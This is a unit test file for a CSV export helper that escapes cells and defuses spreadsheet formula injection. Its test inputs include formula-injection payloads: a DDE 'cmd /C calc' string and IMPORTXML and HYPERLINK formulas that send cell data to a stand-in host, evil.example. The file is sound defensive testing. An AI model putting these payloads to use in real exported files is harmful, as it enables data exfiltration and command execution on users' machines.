import { describe, expect, it } from 'bun:test';
import { csvCell, toCsv } from '../../../src/features/analytics/csv.ts';

describe('csvCell', () => {
  it('leaves plain values untouched', () => {
    expect(csvCell('Ada')).toBe('Ada');
    expect(csvCell(42)).toBe('42');
  });

  it('quotes and escapes cells with commas, quotes or newlines', () => {
    expect(csvCell('Doe, Jane')).toBe('"Doe, Jane"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line\nbreak')).toBe('"line\nbreak"');
  });

  it('defuses every leading character a spreadsheet reads as a formula', () => {
    expect(csvCell('=1+1')).toBe(`"'=1+1"`);
    expect(csvCell('+1+1')).toBe(`"'+1+1"`);
    expect(csvCell('-1+1')).toBe(`"'-1+1"`);
    expect(csvCell('@SUM(A1:A9)')).toBe(`"'@SUM(A1:A9)"`);
    expect(csvCell('\t=1+1')).toBe(`"'\t=1+1"`);
    expect(csvCell('\r=1+1')).toBe(`"'\r=1+1"`);
  });

  it('escapes the quotes inside a defused formula so the cell stays one cell', () => {
    expect(csvCell('=HYPERLINK("http://evil.example","click")')).toBe(
      `"'=HYPERLINK(""http://evil.example"",""click"")"`,
    );
    expect(csvCell("=cmd|' /C calc'!A0, now")).toBe(`"'=cmd|' /C calc'!A0, now"`);
  });

  it('keeps a negative measure a number, not quoted text', () => {
    expect(csvCell(-5)).toBe('-5');
    expect(csvCell(-0.5)).toBe('-0.5');
  });

  it('leaves a formula character that is not leading alone', () => {
    expect(csvCell('Q1 = growth')).toBe('Q1 = growth');
    expect(csvCell('a-b')).toBe('a-b');
  });
});

describe('toCsv', () => {
  it('joins rows with CRLF and cells with commas', () => {
    const csv = toCsv([
      ['Name', 'Completed', 'Total'],
      ['Ada Admin', 3, 5],
      ['Doe, Jane', 1, 2],
    ]);
    expect(csv).toBe('Name,Completed,Total\r\nAda Admin,3,5\r\n"Doe, Jane",1,2');
  });

  it('ships a crafted issue title as inert text', () => {
    const csv = toCsv([
      ['Name', 'Total'],
      ['=IMPORTXML(CONCAT("http://evil.example?x=",A1),"//a")', 1],
    ]);

    const cell = csv.split('\r\n')[1]?.split(',')[0] ?? '';
    expect(cell.startsWith(`"'=`)).toBe(true);
    expect(csv).not.toContain('\r\n=');
    expect(csv).not.toContain(',=IMPORT');
  });
});
